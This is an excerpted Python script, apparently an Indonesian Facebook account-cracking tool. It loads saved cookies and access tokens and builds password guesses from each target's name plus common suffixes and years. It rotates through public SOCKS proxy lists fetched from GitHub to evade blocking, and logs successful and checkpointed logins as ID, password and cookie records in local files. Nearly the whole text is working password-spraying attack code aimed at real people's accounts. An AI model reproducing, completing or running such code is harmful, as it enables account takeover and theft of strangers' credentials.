...
#----------[ HAPUS ]----------#		
def ganti_cokies():
      try:os.remove(".DEMONcokies.txt")
      except:pass
      try:os.remove(".DEMONtoken.txt")
      except:pass
      login_cokies()
                ...
                if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
                    ...
                    if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
                        ...
                        if 'Sukses!' in str(response6):
                            ...
                            ken = open(".DEMONtoken.txt", "w").write(access_token)
                            cok = open(".DEMONcokies.txt", "w").write(your_cookies)
                            print(f"{kun}╭────────────────────────────────────────────{puti}")
...
def menu():
        try:
            token = open('.DEMONtoken.txt','r').read()
            cok = open('.DEMONcokies.txt','r').read()
            tokene.append(token)
            try:
        ...
        print(f"{kun}╭────────────────────────────────────────────{puti}")
        DEMON_GANTENG = input(f'{kun}└──[{puti} Input menu : ')
        if DEMON_GANTENG in ['01','1']:
            crack_publik()
        elif DEMON_GANTENG in ['02','2']:
            hasil_ok()
        elif DEMON_GANTENG in ['03','3']:
            hasil_cp()
        elif DEMON_GANTENG in ['00','0']:
            ganti_cokies()
            print(f"{kun}╭────────────────────────────────────────────{puti}")
...
def hasil_ok():
	...
	if len(vin)==0:
		...
		lol = {}
		for isi in vin:
			try:hem = open('DEMON-OK/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = '0'+str(cih)
		...
		try:lin = open('DEMON-OK/'+geh,'r').read().splitlines()
		except:
		    print(f"{kun}╭────────────────────────────────────────────{puti}")
		    exit(f"{kun}└──[{mer} File tidak di temukan ")
		nocp=0
...
def hasil_cp():
	...
	if len(vin)==0:
		...
		lol = {}
		for isi in vin:
			try:hem = open('DEMON-CP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = '0'+str(cih)
		...
		try:geh = lol[geeh]
		    ...
		    print(f"{kun}╭────────────────────────────────────────────{puti}")
		    exit(f"{kun}└──[{mer} Pilih yang bener :-( ")
		try:lin = open('DEMON-CP/'+geh,'r').read().splitlines()
		except:
		    print(f"{kun}╭────────────────────────────────────────────{puti}")
		    exit(f"{kun}└──[{mer} File tidak di temukan ")
		nocp=0
...
def atur_id():
     ...
     for khusus_random in id:
            DEMON_id = rr(0,len(id2))
            id2.insert(DEMON_id, khusus_random)
     atur_method()
...
def atur_method():
	...
	print(f"{kun}╭────────────────────────────────────────────{puti}") 
	DEMON_METHODE = input(f'{kun}└──[{puti} Input method : ')
	if DEMON_METHODE in ['1','01']:
	   method.append('validate')  
	elif DEMON_METHODE in ['2','02']:
	   method.append('reguler')       
	elif DEMON_METHODE in ['3','03']:
			...
			for _gabutz_ster_ in id2:
				...
				if len(namamu_ku_simpan)<6:
					...
					if len(frestile)<3:
						...
						pwx.append(namamu_ku_simpan)
						pwx.append(frestile+'1212')
						pwx.append(frestile+'1122')
						pwx.append(frestile+'@1@2@3')
						pwx.append(frestile+' 123')
						pwx.append(frestile+'@#')
						pwx.append(frestile+'2004')
						pwx.append(frestile+'2010')
						pwx.append(frestile+'2012')
						pwx.append(frestile+'2014')
						pwx.append(frestile+'2015')
						pwx.append(frestile+'2016')
						pwx.append(frestile+'2017')
						pwx.append(frestile+'2018')
						pwx.append(frestile+'2019')
						pwx.append(frestile+'2020')
						pwx.append(frestile+'2021')
						pwx.append(frestile+'2022')
...
def crackvalidate(idf,pwx,url):
	...
	rc = random.choice
	emot = rc(["😭","😂","😊"])
	prog.update(des,description=f"\r {emot}(DEMON)(%sOK:{ok}%s)(%sCP:{cp}%s)(%s {loop}%s)"%(hijo,puti,kun,puti,hijo,puti))
	prog.advance(des)
	for pw in pwx:
		try:
			proxs = requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt').text
		...
		'viewport-width': f'{str(rr(300,999))}',
	     ...
	     'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print(f"{kun}╰────────────────────────────╯{puti}")
				prints(tree)
				open('DEMON-OK/'+'DEMON-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
				open('DEMON-OK/'+'DEMON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
				break			
				...
				print(f"{kun}╰────────────────────────────╯{puti}")
				prints(tree)
				open('DEMON-CP/'+'DEMON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
				akune.append(idf+'|'+pw)
				ceker(idf,pw)
				cp+=1
				break	
...
def crackasyinc(idf,pwx):
  ...
  for pw in pwx:
    try:
      proxs = requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt').text
      open('socksku.txt','w').write(proxs)
      nip = rc(proxs)
...
if __name__=='__main__':
	...
	try:os.mkdir('DEMON-OK')
	except:pass
	try:os.mkdir('DEMON-CP')
	except:pass
	menu()
